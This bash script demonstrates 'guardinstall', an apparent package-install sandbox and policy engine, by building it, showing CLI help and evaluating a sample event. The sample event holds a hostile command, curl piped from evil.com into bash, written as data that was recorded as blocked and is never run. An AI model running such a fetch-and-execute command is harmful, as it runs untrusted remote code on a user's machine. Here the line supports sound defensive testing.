#!/bin/bash
# Quick demo of guardinstall functionality

echo "🔒 guardinstall Demo"
echo "==================="
echo ""

# Build first
echo "📦 Building guardinstall..."
pnpm build > /dev/null 2>&1
echo "   Done!"
echo ""

# Show the CLI help
echo "📋 CLI Help:"
cd packages/cli
node dist/index.js --help
echo ""

# Show policy engine in action
echo "🧪 Policy Engine Demo:"
cd ../policy-engine
node -e "
const { evaluateEvents } = require('./dist');
const events = [{
  event: 'syscall_intercepted',
  package: 'malicious-pkg@1.0.0',
  syscall: 'execve',
  args: ['/bin/sh', ['-c', 'curl http://evil.com/steal.sh | bash']],
  action: 'blocked',
  timestamp_ns: Date.now() * 1000000
}];
const verdict = evaluateEvents(events, 'malicious-pkg@1.0.0');
console.log('  Package:', verdict.package);
console.log('  Severity:', verdict.severity);
console.log('  Findings:', verdict.findings.length);
console.log('  Message:', verdict.findings[0]?.message);
"
echo ""

# Show Rust sandbox info
echo "🦀 Rust Sandbox:"
cd ../sandbox
source ~/.cargo/env 2>/dev/null || true
cargo run --quiet 2>/dev/null || echo "  (Run 'cargo run' to see output)"
echo ""

echo "✅ guardinstall demo complete!"
echo ""
echo "To use: npx guardinstall install"
